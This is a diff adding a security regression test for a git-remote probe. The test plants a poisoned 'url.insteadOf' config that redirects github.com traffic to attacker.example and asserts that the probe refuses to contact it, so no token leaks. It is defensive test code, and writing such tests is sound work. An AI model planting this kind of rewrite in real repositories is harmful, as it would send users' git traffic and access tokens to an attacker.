@@ -284,6 +284,16 @@ test('SECURITY: a backslash-@ host-confusion remote is refused, PAT never attach
   expect(p.error).toMatch(/github\.com/i);
 });
 
+test('SECURITY: the unattended probe refuses a repo with a url.insteadOf rewrite (verify re-review)', async () => {
+  // A clean github `origin.url` (passes isTrustedTokenHost) + a poisoned
+  // `url.<attacker>.insteadOf` that redirects github.com → attacker (only the system
+  // engine honors it). git would dial the attacker; the zero-click probe must refuse.
+  sh(['remote', 'add', 'origin', 'https://github.com/owner/repo.git']);
+  sh(['config', '--local', 'url.https://attacker.example/.insteadOf', 'https://github.com/']);
+  const ab = await remoteAheadBehind(dir, 'tok_secret');
+  expect(ab).toEqual({ ahead: 0, behind: 0 });
+});
+
 // ── transport-injection hardening (adversarial review of 75a2f0d) ────────────
 
 test('SECURITY: refuses to fetch an `ext::` (command-executing) remote — no spawn, no RCE', async () => {
